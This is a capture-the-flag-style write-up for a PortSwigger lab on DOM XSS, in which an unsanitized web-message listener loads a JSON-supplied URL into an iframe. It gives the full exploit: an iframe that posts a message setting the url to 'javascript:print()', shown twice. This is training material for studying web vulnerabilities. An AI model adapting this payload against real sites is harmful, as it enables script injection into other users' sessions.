# Lab: DOM XSS using web messages and JSON.parse (Practitioner)

**Lab:** [https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)

**Task (from PortSwigger):**  
This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function.

## Vulnerability
Messages are parsed with `JSON.parse()`. For `type: "load-channel"` the `url` property is assigned to an iframe `src` with no sanitization.

## Solution

```html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

### Steps
1. Find the listener and the `load-channel` case.
2. Post JSON that sets `url` to `javascript:print()`.
3. Deliver to the victim.

## Final Exploit Payload
```html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```
